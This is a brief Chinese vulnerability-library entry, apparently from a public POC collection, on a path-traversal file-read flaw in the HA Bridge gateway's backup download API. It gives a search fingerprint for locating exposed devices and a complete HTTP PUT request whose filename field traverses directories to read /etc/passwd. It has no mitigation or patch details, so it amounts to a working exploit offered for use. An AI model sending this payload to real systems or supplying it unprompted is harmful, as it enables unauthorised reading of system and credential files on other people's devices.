# hi-bridge网关download存在文件读取漏洞

# 一、漏洞简介
hi-bridge网关download存在文件读取漏洞

# 二、影响版本
+ hi-bridge网关

# 三、资产测绘
```plain
title="HA Bridge"
```


# 四、漏洞复现
```plain
PUT /api/devices/backup/download HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 


{"filename":"../../../../etc/passwd"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aat3gchwm23g4rhd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
